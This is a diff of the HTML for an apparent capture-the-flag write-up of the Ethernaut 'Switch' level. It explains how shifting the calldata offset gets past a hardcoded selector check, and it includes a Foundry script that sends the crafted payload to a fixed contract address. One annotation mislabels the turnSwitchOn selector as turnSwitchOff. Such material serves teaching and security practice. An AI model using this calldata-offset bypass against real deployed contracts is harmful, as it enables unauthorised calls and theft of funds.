@@ -3695,73 +3695,73 @@ bytes8 one = bytes8(abi.encodePacked(uint32(0xdeadbeef),two));
   <li>We can modify the calldata in order to bypass the check and as well as call the <code class="language-plaintext highlighter-rouge">turnSwitchOn()</code> function.</li>
   <li>Lets understand <code class="language-plaintext highlighter-rouge">calldata</code> specificly when passing dynamic datatypes as arguments</li>
   <li>When we call a function on a contract, the calldata will be sent via the transaction as <code class="language-plaintext highlighter-rouge">msg.data</code>, Lets see what this data consists.
-```
-calldata with dynamic arguments
- =&gt; <function signature=""> <offset> <length of="" data=""> <data>
-Each field will be padded to 32 bytes except function signature.</data></length></offset></function></li>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> calldata with dynamic arguments
+   =&gt; &lt;function signature&gt; &lt;offset&gt; &lt;length of data&gt; &lt;data&gt;
+ Each field will be padded to 32 bytes except function signature.
+
+ calldata when we call flipSwitch() with turnSwitchOff() function signature 
+      30c13ade  // flipSwitch() signature
+ 00 : 0000000000000000000000000000000000000000000000000000000000000020   ==&gt; offset - the starting position of the actual data 
+ 20 : 0000000000000000000000000000000000000000000000000000000000000004   ==&gt; length - data length
+ 40 : 20606e1500000000000000000000000000000000000000000000000000000060   ==&gt; data - data that we passed through argument (turnSwitchOff() signature)
+</code></pre></div>    </div>
+  </li>
+  <li>This call to flipSwitch() is succeeded because the check was passed. The check is that from the 68th byte to 72nd byte will be sliced out and this will be checked with the signature of the <code class="language-plaintext highlighter-rouge">turnSwitchOff()</code> function.</li>
+  <li>Now we somehow should manage to send the <code class="language-plaintext highlighter-rouge">turnSwitchOn()</code> signature along with this calldata. And we should make sure that only <code class="language-plaintext highlighter-rouge">turnSwitchOn()</code> signature should be passed to the <code class="language-plaintext highlighter-rouge">call</code> inside <code class="language-plaintext highlighter-rouge">flipSwitch()</code>.</li>
+  <li>The data which is used inside the function will be specified by the <code class="language-plaintext highlighter-rouge">offset</code>. The function will make use of the actual data that is pointed by the offset.</li>
+  <li>As the <code class="language-plaintext highlighter-rouge">onlyOff</code> modifier uses the hardcoded check, we can modify the calldata to be able to insert the <code class="language-plaintext highlighter-rouge">turnSwitchOff()</code> function signature at the 68th bytes and append the <code class="language-plaintext highlighter-rouge">turnSwitchOn()</code> signature.</li>
+  <li>Now we have to change the offset of the calldata in such a way that it points to the <code class="language-plaintext highlighter-rouge">turnSwitchOn()</code> signature.
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>calldata to bypass onlyOff
+  =&gt; &lt;flipSwitch Singature&gt; &lt;Offset&gt; &lt;Dummy Data&gt; &lt;turnSwitchOff Signature&gt; &lt;length of data&gt; &lt;turnSwitchOn Signature&gt;
+
+   30c13ade
+  00 : 00000000000000000000000000000000000000000000000000000000000000[60]  ==&gt; Offset - position of actual data
+  20 : 0000000000000000000000000000000000000000000000000000000000000000     ==&gt; Dummy data - to move turnSwitchOff data to 68th byte
+  40 : 20606e1500000000000000000000000000000000000000000000000000000000  ==&gt; Data - turnSwitchOff() selector (By passes onlyOff)
+  60 : 0000000000000000000000000000000000000000000000000000000000000004  ==&gt; Length - Length of the turnSwitchOff() signature data
+  80 : 76227e1200000000000000000000000000000000000000000000000000000000  ==&gt; Actual data - turnSwitchOff() signature
+</code></pre></div>    </div>
+  </li>
+  <li>Now this calldata will bypasses the check of onlyOff and we modified the offset to point it to the turnSwitchOn() signature.</li>
+  <li>So, now the calldata passed to the <code class="language-plaintext highlighter-rouge">call</code> inside flipSwitch() will be,
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>76227e1200000000000000000000000000000000000000000000000000000000
+</code></pre></div>    </div>
+  </li>
+  <li>This will call the turnSwitchOn() function in Switch contract. Finally we will be able to solve the challenge.</li>
 </ol>
 
-<p>calldata when we call flipSwitch() with turnSwitchOff() function signature 
-       30c13ade  // flipSwitch() signature
-  00 : 0000000000000000000000000000000000000000000000000000000000000020   ==&gt; offset - the starting position of the actual data 
-  20 : 0000000000000000000000000000000000000000000000000000000000000004   ==&gt; length - data length
-  40 : 20606e1500000000000000000000000000000000000000000000000000000060   ==&gt; data - data that we passed through argument (turnSwitchOff() signature)</p>
+<p><code class="language-plaintext highlighter-rouge">SwitchSolve.s.sol</code></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>9. This call to flipSwitch() is succeeded because the check was passed. The check is that from the 68th byte to 72nd byte will be sliced out and this will be checked with the signature of the `turnSwitchOff()` function.
-10. Now we somehow should manage to send the `turnSwitchOn()` signature along with this calldata. And we should make sure that only `turnSwitchOn()` signature should be passed to the `call` inside `flipSwitch()`. 
-11. The data which is used inside the function will be specified by the `offset`. The function will make use of the actual data that is pointed by the offset.
-12. As the `onlyOff` modifier uses the hardcoded check, we can modify the calldata to be able to insert the `turnSwitchOff()` function signature at the 68th bytes and append the `turnSwitchOn()` signature.
-13. Now we have to change the offset of the calldata in such a way that it points to the `turnSwitchOn()` signature.
-</code></pre></div></div>
-<p>calldata to bypass onlyOff
-    =&gt; <flipSwitch Singature=""> <Offset> <Dummy Data=""> <turnSwitchOff Signature=""> <length of="" data=""> <turnSwitchOn Signature=""></turnSwitchOn></length></turnSwitchOff></Dummy></Offset></flipSwitch></p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
 
-<p>30c13ade
-00 : 00000000000000000000000000000000000000000000000000000000000000[60]  ==&gt; Offset - position of actual data
-20 : 0000000000000000000000000000000000000000000000000000000000000000     ==&gt; Dummy data - to move turnSwitchOff data to 68th byte
-40 : 20606e1500000000000000000000000000000000000000000000000000000000  ==&gt; Data - turnSwitchOff() selector (By passes onlyOff)
-60 : 0000000000000000000000000000000000000000000000000000000000000004  ==&gt; Length - Length of the turnSwitchOff() signature data
-80 : 76227e1200000000000000000000000000000000000000000000000000000000  ==&gt; Actual data - turnSwitchOff() signature</p>
+<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>14. Now this calldata will bypasses the check of onlyOff and we modified the offset to point it to the turnSwitchOn() signature.
-15. So, now the calldata passed to the `call` inside flipSwitch() will be,
-</code></pre></div></div>
-<p>76227e1200000000000000000000000000000000000000000000000000000000</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>16. This will call the turnSwitchOn() function in Switch contract. Finally we will be able to solve the challenge.
+<span class="k">import</span> <span class="dl">"</span><span class="s2">../src/Switch.sol</span><span class="dl">"</span><span class="p">;</span>
 
-`SwitchSolve.s.sol`
+<span class="nx">contract</span> <span class="nx">SwitchSolve</span> <span class="nx">is</span> <span class="nx">Script</span> <span class="p">{</span>
+    <span class="nx">Switch</span> <span class="kr">public</span> <span class="nx">sw</span> <span class="o">=</span> <span class="nc">Switch</span><span class="p">(</span><span class="mh">0x8592a0765f942ba46ADf3a0EB1fF57b1d74664F0</span><span class="p">);</span>
+    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
+        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>
 
-```javascript
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Switch  : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">sw</span><span class="p">.</span><span class="nf">switchOn</span><span class="p">());</span>
 
-import "forge-std/Script.sol";
-import "forge-std/console.sol";
+        <span class="c1">// bytes memory data = abi.encodeWithSignature("turnSwitchOff()");</span>
+        <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">abi</span><span class="p">.</span><span class="nf">encodeWithSignature</span><span class="p">(</span><span class="dl">"</span><span class="s2">flipSwitch(bytes)</span><span class="dl">"</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x20606e1500000000000000000000000000000000000000000000000000000000</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x76227e1200000000000000000000000000000000000000000000000000000000</span><span class="p">);</span>
 
-import "../src/Switch.sol";
+        <span class="nx">console</span><span class="p">.</span><span class="nf">logBytes</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
 
-contract SwitchSolve is Script {
-    Switch public sw = Switch(0x8592a0765f942ba46ADf3a0EB1fF57b1d74664F0);
-    function run() external{
-        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-
-        console.log("Switch  : ", sw.switchOn());
-
-        // bytes memory data = abi.encodeWithSignature("turnSwitchOff()");
-        bytes memory data = abi.encodeWithSignature("flipSwitch(bytes)",0x60, 0x00, 0x20606e1500000000000000000000000000000000000000000000000000000000, 0x04, 0x76227e1200000000000000000000000000000000000000000000000000000000);
-
-        console.logBytes(data);
-
-        address(sw).call(data);
+        <span class="nf">address</span><span class="p">(</span><span class="nx">sw</span><span class="p">).</span><span class="nf">call</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
 
 
 
-        console.log("Switch  : ", sw.switchOn());
+        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Switch  : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">sw</span><span class="p">.</span><span class="nf">switchOn</span><span class="p">());</span>
 
 
-        vm.stopBroadcast();
-    }
-}
+        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div></div>
 
 <p>To run script :</p>
